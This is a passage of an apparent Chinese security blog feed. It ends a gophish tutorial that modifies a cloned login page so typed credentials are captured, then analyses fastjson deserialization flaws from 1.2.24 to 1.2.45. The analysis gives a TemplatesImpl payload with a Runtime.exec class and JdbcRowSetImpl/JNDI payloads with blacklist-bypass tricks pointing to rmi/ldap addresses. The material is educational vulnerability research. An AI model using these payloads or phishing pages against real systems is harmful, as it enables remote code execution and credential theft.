可以看到这里控制登录相关内容。gophish获取用户输入需要form表单，
因此思路为把这里设置为无效隐藏，将代码转移到form表单内。&lt;/p&gt;
&lt;h6 id=&#34;删除隐藏原来用户名密码输入界面&#34;&gt;删除隐藏原来用户名密码输入界面&lt;/h6&gt;
&lt;p&gt;注释掉原本表单&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031845934.png&#34; alt=&#34;image-20221103184535869&#34;&gt;&lt;/p&gt;
&lt;h6 id=&#34;添加新的用户名密码输入表单&#34;&gt;添加新的用户名密码输入表单&lt;/h6&gt;
&lt;p&gt;因为gophish只能按照form表单获取用户输入，因此搜索form，定位到这里
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211030000985.png&#34; alt=&#34;image-20221103000032949&#34;&gt;&lt;/p&gt;
&lt;p&gt;复制原来控制用户名密码的div input到form表单中&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031849631.png&#34; alt=&#34;image-20221103184906566&#34;&gt;
这里a标签不能用了，要换成一个和原来一样的 橙色的登录 提交button
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031851321.png&#34; alt=&#34;image-20221103185152275&#34;&gt;
发现直接注释原来按钮的话页面上的二维码没了，因此需要隐藏原来的按钮不能删除
删掉class，添加type=&amp;quot;hidden&amp;quot;隐藏掉框，删除登录二字&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031854648.png&#34; alt=&#34;image-20221103185424582&#34;&gt;
现在的界面
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031856569.png&#34; alt=&#34;image-20221103185644464&#34;&gt;
有个黑框，style=&amp;quot;border: 0;&amp;quot;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031858776.png&#34; alt=&#34;image-20221103185814709&#34;&gt;
现在的样子和管网高度相似了，二维码也显示正常&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031858115.png&#34; alt=&#34;image-20221103185852065&#34;&gt;
到这里试下gophish获取输入情况，发现不能抓到username
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031906502.png&#34; alt=&#34;image-20221103190608449&#34;&gt;
看下源码，发现passwordbox中没有name=xxx，添加name=&amp;quot;username&amp;quot;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031911877.png&#34; alt=&#34;image-20221103191152823&#34;&gt;
这样就可以抓到了
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031912058.png&#34; alt=&#34;image-20221103191241000&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;结果&#34;&gt;结果&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031913451.png&#34; alt=&#34;image-20221103191351382&#34;&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031914231.png&#34; alt=&#34;image-20221103191426146&#34;&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031914726.png&#34; alt=&#34;image-20221103191452657&#34;&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031942646.png&#34; alt=&#34;image-20221103191509343&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211031918177.png&#34; alt=&#34;image-20221103191844085&#34;&gt;&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://klearcc.github.io/tags/%E9%92%93%E9%B1%BC/" term="钓鱼" label="钓鱼" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">全版本fastjson反序列化漏洞分析</title>
            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/" />
            <id>https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/</id>
            <updated>2022-12-13T17:47:39&#43;08:00</updated>
            <published>2022-10-20T17:08:27&#43;08:00</published>
            <author>
                    <name>Klear</name>
                    <uri>https://klearcc.github.io/</uri>
                    <email>baicaix86@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">记录学习过程，强烈建议仅仅做参考。学习请……</summary>
            
                <content type="html">&lt;h5 id=&#34;记录学习过程强烈建议仅仅做参考学习请移至su18httpssu18orgsu18yyds&#34;&gt;记录学习过程，强烈建议仅仅做参考。学习请移至&lt;a href=&#34;https://su18.org/&#34;&gt;su18&lt;/a&gt;，su18yyds.&lt;/h5&gt;
&lt;h2 id=&#34;目录&#34;&gt;目录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#fastjson%E7%AE%80%E4%BB%8B&#34;&gt;Fastjson简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#fastjson%E4%BD%BF%E7%94%A8&#34;&gt;Fastjson使用&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E5%B0%86json%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%BA%E7%B1%BB&#34;&gt;将json反序列化为类&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#fastjson1224%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E&#34;&gt;Fastjson&amp;lt;=1.2.24反序列化漏洞&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D&#34;&gt;漏洞介绍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#fastjson%E7%AE%80%E5%8D%95%E4%BD%93%E9%AA%8C&#34;&gt;fastjson简单体验&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&#34;&gt;漏洞分析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#1225fastjson1241&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.41&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E4%BF%AE%E5%A4%8D&#34;&gt;修复&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E9%80%BB%E8%BE%91&#34;&gt;逻辑&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E7%BB%95%E8%BF%87%E9%9C%80%E5%BC%80%E5%90%AFautotypesupport&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#fastjson1242&#34;&gt;Fastjson1.2.42&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E4%BF%AE%E5%A4%8D-1&#34;&gt;修复&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E9%80%BB%E8%BE%91-1&#34;&gt;逻辑&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E7%BB%95%E8%BF%87%E9%9C%80%E5%BC%80%E5%90%AFautotypesupport-1&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#1225fastjson1243&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.43&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E4%BF%AE%E5%A4%8D-2&#34;&gt;修复&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E9%80%BB%E8%BE%91-2&#34;&gt;逻辑&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E7%BB%95%E8%BF%87%E9%9C%80%E5%BC%80%E5%90%AFautotypesupport-2&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#fastjson-1244&#34;&gt;Fastjson-1.2.44&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E4%BF%AE%E5%A4%8D-3&#34;&gt;修复&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#1225fastjson1245&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.45&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E7%BB%95%E8%BF%87%E9%9C%80%E5%BC%80%E5%90%AFautotypesupport-3&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#fastjson-1247&#34;&gt;Fastjson-1.2.47&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC&#34;&gt;影响版本&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#%E5%88%86%E6%9E%90&#34;&gt;分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://klearcc.github.io/post/javasec_fastjson%E5%85%A8%E7%89%88%E6%9C%AC/#payload&#34;&gt;payload&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;fastjson简介&#34;&gt;Fastjson简介&lt;/h2&gt;
&lt;p&gt;Fastjson是ali的开源JSON解析库，他可以解析JSON格式的字符串。支持将javabean序列化为JSON字符串，童也支持将JSON字符串反序列化为Java Bean。&lt;/p&gt;
&lt;h2 id=&#34;fastjson使用&#34;&gt;Fastjson使用&lt;/h2&gt;
&lt;h5 id=&#34;将json反序列化为类&#34;&gt;将json反序列化为类&lt;/h5&gt;
&lt;p&gt;常用方法parse()、parseObject()、parseArray() 。每个方法又有几个重载方法，带有不同参数，具体请查看源码。其中：
类的类型：java.lang.reflect.Type。可以使用@type指定反序列化任意类或者说此属性指定json数据应该被反序列化为什么类型的对象
fastjson功能要点：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 使用JSON.parse(jsonString)和JSON.parseObject(jsonString,Target.class)，两者调用链一致，parse会在jsonString中解析字符串获取@type指定的类，parseObject会直接使用参数中的class
2. 使用JSON.parseObject(jsonString)将会返回JSONObeject对象，并且类中的set&amp;amp;&amp;amp;get方法都会被调用(指定@type的情况下)
3.fastjson在为类属性寻找get/set方法时，调用com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()方法，会忽略_|-字符串，也就是说就算字段名为_ag_e，getter方法为getAge(),fastjson也可以找到，
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;fastjson1224反序列化漏洞&#34;&gt;Fastjson&amp;lt;=1.2.24反序列化漏洞&lt;/h2&gt;
&lt;h5 id=&#34;漏洞介绍&#34;&gt;漏洞介绍&lt;/h5&gt;
&lt;p&gt;影响版本：fastjson &amp;lt;= 1.2.24
描述：fastjson默认使用@type指定反序列化任意类，攻击者可以通过 在Java常见环境中 寻找能够构造恶意类的方法，通过反序列化过程中调用的getter|setter方法 和 目标成员变量的注入 来达到传参的目的，最后组成利用链。&lt;/p&gt;
&lt;h5 id=&#34;fastjson简单体验&#34;&gt;fastjson简单体验&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;新建maven项目，引入fastjson依赖&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;dependencies&amp;gt;
    &amp;lt;dependency&amp;gt;
        &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;fastjson&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;1.2.23&amp;lt;/version&amp;gt;
    &amp;lt;/dependency&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;先建一个javabean User.java&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/**
 * @author: 秦始皇
 * @date: 10/20/22 15:56
 * @description:
 */
public class User {
    private String name;

    public String getName() {
        System.out.println(&amp;#34;getName is running ...&amp;#34;);
        return name;
    }

    public void setName(String name) {
        System.out.println(&amp;#34;setName is running ...&amp;#34;);
        this.name = name;
    }

    @Override
    public String toString() {
        return &amp;#34;User{&amp;#34; +
                &amp;#34;name=&amp;#39;&amp;#34; + name + &amp;#39;\&amp;#39;&amp;#39; +
                &amp;#39;}&amp;#39;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用fastjson将json数据反序列化为对象&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import com.alibaba.fastjson.JSON;

/**
 * @author: 秦始皇
 * @date: 10/20/22 15:58
 * @description:
 */
public class Test {
    public static void main(String[] args) {
        String json = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;User\&amp;#34;, \&amp;#34;name\&amp;#34;:\&amp;#34;秦始皇\&amp;#34;}&amp;#34;;
        Object obj = JSON.parse(json);
        System.out.println(obj);


    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;结果&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;setName is running ...
User{name=&amp;#39;秦始皇&amp;#39;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;@type起的作用：上面代码(Test)的obj对象是Object类型的对象，但是从输出结果来看是User类型的对象。
terminal输出setName is running，说明整个过程中setName方法也被调用了。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h5&gt;
&lt;p&gt;rmi/ldap利用 java版本限制，因为java官方觉得让服务去请求远程的类的确是一个很危险的操作，所以在后来的版本中默认将这个功能关掉了。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于rmi的利用方式：适用jdk版本：&lt;code&gt;JDK 6u132&lt;/code&gt;, &lt;code&gt;JDK 7u122&lt;/code&gt;, &lt;code&gt;JDK 8u113&lt;/code&gt;之前。&lt;/li&gt;
&lt;li&gt;基于ldap的利用方式：适用jdk版本：&lt;code&gt;JDK 11.0.1&lt;/code&gt;、&lt;code&gt;8u191&lt;/code&gt;、&lt;code&gt;7u201&lt;/code&gt;、&lt;code&gt;6u211&lt;/code&gt;之前&lt;/li&gt;
&lt;/ul&gt;
&lt;h6 id=&#34;templatesimpl&#34;&gt;TemplatesImpl&lt;/h6&gt;
&lt;p&gt;TemplatesImpl类位于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，实现了Serialize接口，因此可以被反序列化。&lt;/p&gt;
&lt;p&gt;类中的getOutputProperties()方法是类成员变量 _outPutProperties的getter方法，它调用了newTransformer()方法
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/202212131745102.png&#34; alt=&#34;image-20221213155356078&#34;&gt;
newTransformer()方法又调用了getTransletInstance()方法
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212131746158.png&#34; alt=&#34;image-20221213155520765&#34;&gt;
这个方法中存在一个 _class，是一个Class类型的数组，数组下标为 _transletIndex的类会在getTransletInstance()方法中使用newInstance()实例化
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/202212131746152.png&#34; alt=&#34;image-20221213155901998&#34;&gt;
这样调用链就有点眉目了，所以现在看 _class是否可控。findusages有三处调用
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212131747553.png&#34; alt=&#34;image-20221213160450615&#34;&gt;
看下defineTransletClasses()的逻辑
_bytecodes非空，然后调用自定义classload加载 _bytecode中的byte[],并且如果这个类的父类为ABSTRACT_TRANSLET，就会将类成员属性的 _transletIndex设置为当前循环中的标记位，如果是第一次调用，就是 _class[0]，如果父类不是这个类则抛出异常。
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/img202212131747192.png&#34; alt=&#34;image-20221213161332002&#34;&gt;&lt;/p&gt;
&lt;p&gt;这样一条完整的链揪出来了&lt;/p&gt;
&lt;p&gt;构造一个TemplatesImpl类的反序列化字符串，其中 _bytecodes是我们构造的恶意类的字节码，而且他的父类是AbstractTranslat，最终这个类会被加载并使用newInstance()实例化
返序列化过程中，由于getter方法getOutputProperties()满足条件，会被fastjson调用，这个方法触发了整个利用链getOutputProperties()-&amp;gt;newTransformer()-&amp;gt;getTransletInstance()-&amp;gt;defineTransletClasses()-&amp;gt;EvilClass.newInstance&lt;/p&gt;
&lt;p&gt;为了满足漏洞点触发之间不退出，还需满足 _name非空，_factory非空。有些私有变量没有setter方法，需要使用Feature.SupportNonPublicField&lt;/p&gt;
&lt;p&gt;最终payload&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;String json8 = &amp;#34;{\n&amp;#34; +
        &amp;#34;    \&amp;#34;@type\&amp;#34;: \&amp;#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&amp;#34;,\n&amp;#34; +
        &amp;#34;    \&amp;#34;_bytecodes\&amp;#34;: [\&amp;#34;&amp;#34;+code+&amp;#34;\&amp;#34;],\n&amp;#34; +
        &amp;#34;    \&amp;#34;_name\&amp;#34;: \&amp;#34;klear\&amp;#34;,\n&amp;#34; +
        &amp;#34;    \&amp;#34;_tfactory\&amp;#34;: {},\n&amp;#34; +
        &amp;#34;    \&amp;#34;_outputProperties\&amp;#34;: { },\n&amp;#34; +
        &amp;#34;}&amp;#34;;
###拿到恶意类字节码
        String code = Base64.getEncoder().encodeToString(Repository.lookupClass(xxxx.class).getBytes());
        System.out.println(code);
###恶意类
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * @author: 秦始皇
 * @date: 12/13/22 14:39
 * @description:
 */
public class vulclassTempl extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    public vulclassTempl() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class cls = Class.forName(&amp;#34;java.lang.Runtime&amp;#34;);
        Method method = cls.getMethod(&amp;#34;getRuntime&amp;#34;,null);
        Object obs = method.invoke(null,null);
        Method method1 = obs.getClass().getMethod(&amp;#34;exec&amp;#34;,String.class);
        method1.invoke(obs,&amp;#34;open -a Calculator.app&amp;#34;);
    }

    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException {
        vulclassTempl vulclassTempl = new vulclassTempl();

    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;1225fastjson1241&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.41&lt;/h2&gt;
&lt;h5 id=&#34;修复&#34;&gt;修复&lt;/h5&gt;
&lt;p&gt;引入了checkAutoType安全机制，默认关闭，不能反序列化任意类。打开checkAutoType后，基于内置黑名单过滤。
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141104421.png&#34; alt=&#34;image-20221114110400340&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;逻辑&#34;&gt;逻辑&lt;/h5&gt;
&lt;p&gt;看看checkAutoType的逻辑判断流程。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果开启autoType，则会先校验白名单，白名单存在就使用typeUtils.loadClass加载，再匹配黑名单
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141116976.png&#34; alt=&#34;image-20221114111645938&#34;&gt;&lt;/li&gt;
&lt;li&gt;如果关闭autoType，则会先匹配黑名单，再匹配白名单&lt;/li&gt;
&lt;li&gt;如果开启autoType，使用typeUtils.loadClass加载&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;绕过需开启autotypesupport&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/h5&gt;
&lt;p&gt;这里就出现逻辑问题了，在开启autoType时，只要黑名单匹配不到就可以使用typeUtils.loadClass加载
再看看typeUtils.loadClass
如果className是以L开头，分号结尾的话直接删掉。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141145398.png&#34; alt=&#34;image-20221114114525360&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以说@type就出来了，比如jdbc链-&amp;gt; Lcom.sun.rowset.JdbcRowSetImpl;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;debug时需要开启autoType： ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
{
		&amp;#34;@type&amp;#34;:&amp;#34;Lcom.sun.rowset.JdbcRowSetImpl;&amp;#34;,
    &amp;#34;dataSourceName&amp;#34;:&amp;#34;rmi://127.0.0.1:1099/vulClass&amp;#34;,
    &amp;#34;autoCommit&amp;#34;:true
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;fastjson1242&#34;&gt;Fastjson1.2.42&lt;/h2&gt;
&lt;h5 id=&#34;修复-1&#34;&gt;修复&lt;/h5&gt;
&lt;p&gt;使用hash设置黑名单，防止安全研究人员对后续版本进行攻击；对之前使用符号绕过黑名单校验进行了修复
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141436419.png&#34; alt=&#34;image-20221114143656402&#34;&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141432153.png&#34; alt=&#34;image-20221114143249113&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;逻辑-1&#34;&gt;逻辑&lt;/h5&gt;
&lt;p&gt;checkAutoType中，如果匹配到className的第一个字符是L和最后一个字符是分号的话，使用substring截取className的第二位到倒数第二位&lt;/p&gt;
&lt;h5 id=&#34;绕过需开启autotypesupport-1&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/h5&gt;
&lt;p&gt;因为使用substring截取className的第二位到倒数第二位，双写 L和分号 即可绕过&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{
    &amp;#34;@type&amp;#34;:&amp;#34;LLcom.sun.rowset.JdbcRowSetImpl;;&amp;#34;,
    &amp;#34;dataSourceName&amp;#34;:&amp;#34;rmi://127.0.0.1:1099/VulClass&amp;#34;,
    &amp;#34;autoCommit&amp;#34;:true
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;1225fastjson1243&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.43&lt;/h2&gt;
&lt;h5 id=&#34;修复-2&#34;&gt;修复&lt;/h5&gt;
&lt;p&gt;1.2.43版本主要修复42版本中双写绕过的问题。在checkAutoType中添加了 如果className开头出现了两个LL将会抛出异常
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141631595.png&#34; alt=&#34;image-20221114163128525&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;逻辑-2&#34;&gt;逻辑&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;L&lt;/code&gt;和&lt;code&gt;;&lt;/code&gt;被限制了，但是&lt;code&gt;[&lt;/code&gt;也参与了处理，讲道理&lt;code&gt;[&lt;/code&gt;也可以绕过黑名单用。由于1.2.42及以后判断用hash写的，不便于观察，因此使用1.2.25debug。
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150836304.png&#34; alt=&#34;image-20221115083630236&#34;&gt;
很明显@type值最前面添加&lt;code&gt;[&lt;/code&gt;即可，添加后提示第46个字符缺少&lt;code&gt;[&lt;/code&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150847088.png&#34; alt=&#34;image-20221115084717042&#34;&gt;
添加后提示第50个字符缺少&lt;code&gt;{&lt;/code&gt;
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150848872.png&#34; alt=&#34;image-20221115084846839&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;绕过需开启autotypesupport-2&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/h5&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{ 
  &amp;#34;@type&amp;#34;: &amp;#34;[com.sun.rowset.JdbcRowSetImpl&amp;#34;[,
  {&amp;#34;dataSourceName&amp;#34;: &amp;#34;ldap://127.0.0.1:1389/VulClass&amp;#34;,
  &amp;#34;autoCommit&amp;#34;: true&amp;#34;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;fastjson-1244&#34;&gt;Fastjson-1.2.44&lt;/h2&gt;
&lt;h5 id=&#34;修复-3&#34;&gt;修复&lt;/h5&gt;
&lt;p&gt;对上个版本中使用&lt;code&gt;[&lt;/code&gt;绕过的问题进行了修复，到这个版本字符绕过黑名单的方式暂时告一段落
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211151014721.png&#34; alt=&#34;image-20221115101443630&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;1225fastjson1245&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.45&lt;/h2&gt;
&lt;p&gt;黑名单：org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&lt;/p&gt;
&lt;h5 id=&#34;绕过需开启autotypesupport-3&#34;&gt;绕过（需开启AutoTypeSupport）&lt;/h5&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{ 
    &amp;#34;@type&amp;#34;:&amp;#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&amp;#34;,
    &amp;#34;properties&amp;#34;:{&amp;#34;data_source&amp;#34;:&amp;#34;ldap://127.0.0.1:1389/VulClass&amp;#34;}
}
